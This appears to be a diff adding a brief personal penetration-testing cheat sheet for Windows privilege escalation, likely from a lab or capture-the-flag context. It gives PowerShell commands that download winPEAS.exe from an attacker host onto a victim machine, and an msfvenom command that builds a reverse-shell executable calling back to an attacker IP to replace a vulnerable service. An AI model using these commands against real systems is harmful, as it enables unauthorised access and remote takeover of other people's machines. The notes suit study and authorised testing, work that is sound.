@@ -1,0 +1,13 @@
+To get a file from attacker mahcine to victim:
+
+Use powershell -c
+
+powershell -c "Invoke-WebRequest -OutFile winPEAS.exe http://<attacker ip>/winPEAS.exe"
+or
+powershell -c wget "http://attacker_IP/winPEAS.exe" -outfile "WinPEAS.exe"
+
+For listing Services
+powershell -c "Get-Service"
+
+Use msfvenom to create a payload for the vulnerable Service: Example-
+msfvenom -p windows/shell_reverse_tcp LHOST=<attacker ip> LPORT=1234 -f exe -o ASCService.exe
